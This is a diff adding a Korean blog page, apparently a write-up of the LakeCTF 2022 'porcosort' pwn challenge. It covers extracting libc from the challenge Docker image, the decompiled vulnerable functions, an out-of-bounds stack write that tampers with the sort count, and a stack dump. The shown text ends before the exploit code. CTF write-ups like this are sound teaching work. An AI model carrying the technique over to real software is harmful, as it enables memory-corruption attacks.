@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="분석 환경: Windows 11, Ubuntu 22.04사용자 제공 파일: 바이너리, 도커파일 tmilibc 때문에.. 고생을 좀 했지만 결론적으로는 잘 해결했다.  맨 처음에 Ubuntu 20.04에서 분석 및 익스 진행하려고 했는데 실행이 잘 되지 않아 그냥 Ubuntu 22.04에서 진행했다. 버전을 올린 이유는 20.04에서 실행할 때 GLibc?">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LakeCTF 2022 - porcosort (Dockerfile, libc, oob)">
+<meta property="og:url" content="https://jiravvit.github.io/lakectf2022-porcosort/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="분석 환경: Windows 11, Ubuntu 22.04사용자 제공 파일: 바이너리, 도커파일 tmilibc 때문에.. 고생을 좀 했지만 결론적으로는 잘 해결했다.  맨 처음에 Ubuntu 20.04에서 분석 및 익스 진행하려고 했는데 실행이 잘 되지 않아 그냥 Ubuntu 22.04에서 진행했다. 버전을 올린 이유는 20.04에서 실행할 때 GLibc?">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-10-03T22:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-22T18:47:30.713Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="oob">
+<meta property="article:tag" content="LakeCTF">
+<meta property="article:tag" content="Dockerfile">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>LakeCTF 2022 - porcosort (Dockerfile, libc, oob)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/d-ctf2022-alarm/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/lakectf2022-attack_on_canary/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/lakectf2022-porcosort/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/lakectf2022-porcosort/&text=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/lakectf2022-porcosort/&is_video=false&description=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)&body=Check out this article: https://jiravvit.github.io/lakectf2022-porcosort/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/lakectf2022-porcosort/&title=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/lakectf2022-porcosort/&name=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/lakectf2022-porcosort/&t=LakeCTF 2022 - porcosort (Dockerfile, libc, oob)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tmi"><span class="toc-number">1.</span> <span class="toc-text">tmi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EB%A1%9C%EC%BB%AC%EC%97%90%EC%84%9C-%EB%AC%B8%EC%A0%9C-%ED%99%98%EA%B2%BD-%EC%84%B8%ED%8C%85%ED%95%98%EA%B8%B0-feat-%EB%8F%84%EC%BB%A4%ED%8C%8C%EC%9D%BC%EC%9D%B4-%EC%A3%BC%EC%96%B4%EC%A1%8C%EC%9D%84-%EB%95%8C-libc-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0"><span class="toc-number">2.1.</span> <span class="toc-text">로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95"><span class="toc-number">2.2.</span> <span class="toc-text">보호 기법</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EC%B7%A8%EC%95%BD%EC%A0%90"><span class="toc-number">2.3.</span> <span class="toc-text">취약점</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vuln-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.1.</span> <span class="toc-text">vuln 함수</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#read-numbers-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">read_numbers 함수</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-gnomed-%ED%95%A8%EC%88%98"><span class="toc-number">2.3.3.</span> <span class="toc-text">get_gnomed 함수</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4"><span class="toc-number">3.1.</span> <span class="toc-text">시나리오</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EA%B0%80%EC%A0%AF-%EC%B0%BE%EA%B8%B0"><span class="toc-number">3.2.</span> <span class="toc-text">가젯 찾기</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret"><span class="toc-number">3.2.1.</span> <span class="toc-text">ret</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">3.4.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        LakeCTF 2022 - porcosort (Dockerfile, libc, oob)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-03T22:00:00.000Z" itemprop="datePublished">2022-10-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Dockerfile/" rel="tag">Dockerfile</a>, <a class="tag-link-link" href="/tags/LakeCTF/" rel="tag">LakeCTF</a>, <a class="tag-link-link" href="/tags/oob/" rel="tag">oob</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>분석 환경: Windows 11, Ubuntu 22.04<br>사용자 제공 파일: 바이너리, 도커파일</p>
+<h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>libc 때문에.. 고생을 좀 했지만 결론적으로는 잘 해결했다. </p>
+<p>맨 처음에 Ubuntu 20.04에서 분석 및 익스 진행하려고 했는데 실행이 잘 되지 않아 그냥 Ubuntu 22.04에서 진행했다. 버전을 올린 이유는 20.04에서 실행할 때 GLibc? 그 버전이 낮아서 실행이 안된다고 에러 문구가 떴기 때문에 당연하게도(?) 22.04로 버전을 올릴 생각을 하였기 때문이다. 하지만 결론적으로 Ubuntu 22.04의 libc도 아니었기 때문에(arch의 libc였음) 굳이 22.04로 버전을 안올리고 문제를 풀 수도 있었다.</p>
+<p>ctf 챌린지에서 도커파일을 제공하는 이유는 libc 버전 때문이다. libc 파일을 던져준 것은 아니지만 libc를 거져준 것이나 다름없다. 알고있었지만 활용하는 방법을 제대로 알지 못했다. libc 때문에 삽질을 많이 해서 결국 롸업을 찾아보고 해당 부분을 바로 해결할 수 있었다. </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup">https://blog.csotiriou.com/post/lakectf-2022-qualifier-porcosort-pwn/#1-setup</a></p>
+<p>이번 기회로 도커파일을 눈여겨봐야겠다는 생각과 libc를 가져오고 patch하는 방법을 배웠다. 이제라도 알게 되어서 다행이다.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기"><a href="#로컬에서-문제-환경-세팅하기-feat-도커파일이-주어졌을-때-libc-가져오기" class="headerlink" title="로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)"></a>로컬에서 문제 환경 세팅하기 (feat. 도커파일이 주어졌을 때 libc 가져오기)</h3><p>Ubuntu 22.04에서 <code>ldd</code> 명령을 통해 바이너리에 매핑된 라이브러리를 알 수 있다. Ubuntu 20.04에서 진행했을 때는 버전에 맞는 libc가 없어서 실행조차 되지 않았는데, 여기선 그래도 실행은 된다. 하지만 아무리 실행이 되더라도 remote와 환경이 다를 수도 있기 때문에 제공된 도커파일을 꼭 확인해야 한다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">	linux-vdso.so.1 (0x00007ffc8615e000)</span><br><span class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f976d66e000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007f976d8ad000)</span><br></pre></td></tr></table></figure>
+
+<p>도커파일을 확인해보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM docker.io/library/archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 AS builder</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>문제 환경이 Ubuntu가 아니라 arch linux임을 알 수 있다. 저기로 접속해서 libc를 가져와 바이너리를 patch하는 작업을 진행하자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v `pwd`:/data archlinux@sha256:2bfe247c46221b0770325d69ec195b50455b2865588665e6926b2d1168982e67 bash</span><br></pre></td></tr></table></figure>
+
+<p>도커를 실행하면 컨테이너에 접속할 수 있다.<br>다른 터미널 창을 열어서 컨테이너로 문제 바이너리를 넣어주고 <code>ldd</code> 명령어로 매핑된 라이브러리를 확인해보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp /home/jir4vvit/ctf/lake/porcosort2/porcorsort ce9c17249f0e:/home/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ce9c17249f0e home]# ldd porcosort</span><br><span class="line">	linux-vdso.so.1 (0x00007fff4e6ca000)</span><br><span class="line">	libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f2f35895000)</span><br><span class="line">	/lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f2f35aae000)</span><br></pre></td></tr></table></figure>
+
+<p>다른 터미널에서 아래 두 명령어로 컨테이너 안의 ld와 libc 파일을 가져오자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker cp ce9c17249f0e:/usr/lib/libc.so.6 /home/jir4vvit/ctf/lake/porcosort2/</span><br><span class="line">docker cp ce9c17249f0e:/usr/lib64/ld-linux-x86-64.so.2 /home/jir4vvit/ctf/lake/porcosort2/</span><br></pre></td></tr></table></figure>
+
+<p>그럼 이제 로컬에 ld와 libc가 저장이 되고, <code>patchelf</code>를 이용해서 바이너리를 패치할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --replace-needed libc.so.6 ./libc.so.6 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ patchelf --set-rpath . --set-interpreter ./ld-linux-x86-64.so.2 porcosort</span><br><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ldd porcosort </span><br><span class="line">	linux-vdso.so.1 (0x00007ffff7d92000)</span><br><span class="line">	./libc.so.6 (0x00007f3122b16000)</span><br><span class="line">	./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f3122d2f000)</span><br></pre></td></tr></table></figure>
+
+<p><code>--set-interpreter &lt;ld&gt;</code>: 다운받은 ld(로더)를 지정<br><code>--replace-needed &lt;libc&gt;</code>: libc 교체 </p>
+<p>그럼 이제 문제 환경(remote)와 local이 똑같아졌다! 가젯 찾을 일 있으면 가져온 libc나 ld에서 가젯찾으면 된다.</p>
+<h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>전부 다 걸려있다. :(</p>
+<h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>우리의 친구 IDA와 함께 차근차근 분석하면서 취약점을 찾아보자.</p>
+<h4 id="vuln-함수"><a href="#vuln-함수" class="headerlink" title="vuln 함수"></a>vuln 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class="line">  __int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">47</span>; ++i )</span><br><span class="line">    stack_buf[i] = _bss_start;</span><br><span class="line">  __asm &#123; rdrand  rbx &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Have a gift: %p\n&quot;</span>, stack_buf[(_RBX ^ a1) % <span class="number">0x30</span>]);<span class="comment">// _IO_2_1_stdout_</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;How many numbers to sort? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;sort_cnt);            <span class="comment">// 48</span></span><br><span class="line">  <span class="keyword">if</span> ( sort_cnt &gt; <span class="number">48</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  read_numbers(stack_buf, sort_cnt);</span><br><span class="line">  get_gnomed(stack_buf, sort_cnt);              <span class="comment">// 정렬하는 코드</span></span><br><span class="line">                                                <span class="comment">// 여기 sort_cnt 값 조작 가능 (48보다 큰 수 넣기 가능)</span></span><br><span class="line">                                                <span class="comment">// 정확히는 read_numbers에서 oob write 발생</span></span><br><span class="line">  <span class="keyword">return</span> canary - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>vuln</code> 함수에서 <code>_IO_2_1_stdout_</code>을 출력해 준다. (gdb로 바로 찍어봤다.)<br>그리고 어떠한 수를 입력받고 그 입력값을 인자로 <code>read_numbers</code> 함수와 <code>get_gnomed</code> 함수를 호출한다.</p>
+<h4 id="read-numbers-함수"><a href="#read-numbers-함수" class="headerlink" title="read_numbers 함수"></a>read_numbers 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_numbers</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">for</span> ( i = cnt; i &gt; <span class="number">0</span>; --i )                   <span class="comment">// 뒤에서부터 채우기</span></span><br><span class="line">                                                <span class="comment">// cnt ~ 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    buf[i] = <span class="string">&#x27;*&#x27;</span>;                               <span class="comment">// *로 채우기</span></span><br><span class="line">    result = __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;buf[i]);   <span class="comment">// * 찍은 곳에 값 쓰기 가능</span></span><br><span class="line">                                                <span class="comment">// (위에서 한 * 채우기는 그냥 초기화 작업)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>두 번째 인자 <code>cnt</code>는 나의 입력 값이다. 결론적으로 스택에 내가 원하는 데이터를 넣을 수 있다.</p>
+<p>이때 oob write가 가능하다. 인자로 넘어온 <code>buf</code>는 크기가 48이다. 이때 <code>cnt</code>가 48이라면 <code>&amp;buf[48]</code>에 접근하여 쓰기가 가능하다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48] ~ &amp;buf[1]</span><br></pre></td></tr></table></figure>
+
+<p>oob write가 발생하지 않으려면(원래대로라면) 아래처럼 0부터 <code>cnt-1</code>까지만 접근해야겠지.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48-1] ~ &amp;buf[0]</span><br></pre></td></tr></table></figure>
+
+<p>그럼 이제 우리가 oob를 통해 접근할 수 있는 <code>&amp;buf[48]</code>에 저장된 값이 뭔지 궁금하다. </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure>
+
+<p><code>buf</code> 바로 밑에 <code>cnt</code>가 존재한다. 그렇다. <code>&amp;buf[48]</code>에는 우리의 입력값인 <code>cnt</code>가 저장되어 있다. 이 말 즉슨.. <code>read_numbers</code> 함수가 끝나고 다음 호출될 <code>get_gnomed</code> 함수의 인자를 조작 가능하다는 의미이다.</p>
+<h4 id="get-gnomed-함수"><a href="#get-gnomed-함수" class="headerlink" title="get_gnomed 함수"></a>get_gnomed 함수</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_gnomed</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *curr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  curr = buf;</span><br><span class="line">  <span class="keyword">while</span> ( curr &lt; &amp;buf[cnt] )                    <span class="comment">// 처음엔 stdout addr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( curr == buf || *curr &gt;= *(curr - <span class="number">1</span>) ) <span class="comment">// 음수로 크기 비교</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++curr;                                   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      *(curr - <span class="number">1</span>) ^= *curr;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      --curr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>그냥 크기 순으로 정렬하는 코드이다. 대소비교에 마우스를 올려보면 <code>*curr &gt;= *(curr-1)</code> 에서 signed로 비교를 하고 있는 것을 확인할 수 있다. 참고로 이 사실은 익스하는 데에 있어서 아주 중요하다.. </p>
+<p>스택에 원하는 값들을 적으면 결국 여기에서 다시 정렬하게 되는데, 크기 순으로 정렬이 되니까 값을 어떻게 넣을 지 생각을 잘해야 한다.</p>
+<p>음 취약점을 설명하는 해당 부분에서는 살짝 맞지 않는 것 같지만 이어서 설명하는 것이 이해하기에 쉬운 것 같아 바로 스택을 보여주겠다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:	0x00007f29d7a406c0	0x8000000000006873</span><br><span class="line">0x7ffe3265c050:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c060:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c070:	0x8000000000006873	0x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:	0x00007f29d788ca40	0x00007f29d786a1d6</span><br><span class="line">0x7ffe3265c1c0:	0x0000000000000039	0xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:	0x0000000000000000	0xa3d3707cd6109c68</span><br><span class="line">0x7ffe3265c1e0:	0x00007ffe3265c240	0x0000562e91ec649e // 해당 함수가 끝나고 0x0000562e91ec649e로 감</span><br><span class="line">0x7ffe3265c1f0:	0x8000000000006873	0x8000000000006873</span><br><span class="line">0x7ffe3265c200:	0x8000000000006873	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>이 값들을 <code>get_gnomed</code> 함수를 거치면 아래와 같다.</p>
